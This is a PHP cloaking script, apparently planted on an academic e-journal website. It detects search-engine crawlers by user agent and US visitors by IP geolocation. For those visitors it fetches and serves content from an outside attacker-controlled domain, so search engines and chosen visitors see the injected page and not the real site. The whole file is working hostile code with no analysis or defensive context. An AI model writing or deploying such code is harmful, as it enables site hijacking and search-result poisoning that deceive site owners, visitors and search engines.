<?php
function getUserCountry() {
    $ip = $_SERVER['REMOTE_ADDR'];
    $url = "http://ip-api.com/json/{$ip}";
    
    $response = @file_get_contents($url);
    if ($response) {
        $data = json_decode($response, true);
        return $data['countryCode'] ?? null;
    }
    return null;
}

function is_bot() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
    
    return preg_match($botchar, $user_agent);
}

$Biawak = "https://rayapbesi-boy.xyz/landing/ejournal.stairaya.ac.id/index.txt";

if (is_bot()) {
    echo @file_get_contents($Biawak);
    exit;
}

if (getUserCountry() === "US") {
    header("Content-Type: text/html; charset=UTF-8");
    echo @file_get_contents($Biawak);
    exit();
}

?>